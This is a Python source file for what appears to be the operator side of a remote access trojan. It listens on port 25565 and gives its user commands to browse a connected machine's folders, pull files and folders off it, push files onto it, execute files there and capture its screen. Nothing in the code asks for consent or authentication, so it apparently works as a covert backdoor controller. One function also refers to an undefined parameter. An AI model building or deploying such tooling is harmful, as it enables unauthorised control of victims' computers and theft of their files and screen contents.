import os
import socket
import time


socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind(('', 25565))
running = True
download_output = "download"
socket.listen(5)
client, address = socket.accept()

def Clear():
    for i in range(10):
        print("\n")


def MoveToFolder(folder):
    Clear()
    client.send(f"goto".encode())
    time.sleep(0.5)
    client.send(args.encode())
    while True:
        filename = client.recv(1024).decode()
        if filename == "end":
            return
        print(filename)


def Refresh():
    Clear()
    client.send(f"refresh".encode())

    while True:
        filename = client.recv(1024).decode()
        if filename == "end":
            return
        print(filename)


def Back():
    Clear()
    client.send(f"back".encode())

    while True:
        filename = client.recv(1024).decode()
        if filename == "end":
            return
        print(filename)

def Download(args):
    Clear()
    client.send(f"download".encode())
    time.sleep(0.5)
    client.send(args.encode())
    while True:
        callback = client.recv(1024).decode()
        if callback == 'end':
            Refresh()
            return
        if callback == 'fold':
            path = client.recv(1024).decode()
            print("fold",path)
            os.mkdir(os.path.join(download_output,path))
        elif callback == 'error':
            print('file does not exist')
        elif callback =='file':
            path = client.recv(1024).decode()
            print("file",path)
            with open(os.path.join(download_output,path),"wb") as f:
                while True:
                    data = client.recv(1024)
                    try:
                        if data.decode() == 'end':
                            break
                    except:
                        pass
                    f.write(data)


def Path(args):
    Clear()
    client.send(f"path".encode())
    time.sleep(0.5)
    client.send(args.encode())
    msg = client.recv(1024).decode()
    if msg != "end":
        print(msg)
        time.sleep(1.5)
    Refresh()

def Upload():
    Clear()
    if not os.listdir("upload"):
        print("upload folder is empty")
        return
    client.send(f"upload".encode())
    time.sleep(0.5)
    for dossier_actuel, sous_dossiers, fichiers in os.walk("upload"):
        client.sendall(f"fold".encode())
        time.sleep(0.5)
        print(os.path.relpath(dossier_actuel,os.path.pardir))
        client.sendall(f"{dossier_actuel}".encode())
        time.sleep(0.5)
        for fichier in fichiers:
            chemin_fichier = os.path.join(dossier_actuel, fichier)
            chemin_destination = os.path.join(dossier_actuel, fichier)
            client.sendall(f"file".encode())
            time.sleep(0.5)
            client.sendall(f"{chemin_destination}".encode())
            time.sleep(0.5)
            with open(chemin_fichier, "rb") as f:
                data = f.read(1024)
                while data:
                    client.sendall(data)
                    data = f.read(1024)
                time.sleep(0.5)
                client.sendall("end".encode())
                time.sleep(0.5)
    time.sleep(0.5)
    client.sendall('end'.encode())
    Refresh()


def Execute(args):
    Clear()
    client.send(f"execute".encode())
    time.sleep(0.5)
    client.send(args.encode())
    print(client.recv(1024).decode())


def Screen():
    client.send(f"screen".encode())
    while True:
        callback = client.recv(1024).decode()
        if callback == 'end':
            Refresh()
            return
        if callback == 'fold':
            path = client.recv(1024).decode()
            print("fold",path)
            os.mkdir(os.path.join(download_output,path))
        elif callback == 'error':
            print('file does not exist')
        elif callback =='file':
            path = client.recv(1024).decode()
            print("file",path)
            with open(os.path.join(download_output,path),"wb") as f:
                while True:
                    data = client.recv(1024)
                    try:
                        if data.decode() == 'end':
                            break
                    except:
                        pass
                    f.write(data)


Refresh()
while running:
    command = input("command:")
    if command == "help":
        print("help")
    elif command == "goto":
        args = input("folder:")
        MoveToFolder(args)
    elif command == "refresh":
        Refresh()
    elif command == "..":
        Back()
    elif command == "download":
        args = input("folder:")
        Download(args)
    elif command == "path":
        args = input("folder:")
        Path(args)
    elif command == "upload":
        Upload()
    elif command == "exec" or command == "execute":
        args = input("file:")
        Execute(args)
    elif command == "screen":
        Screen()

client.close()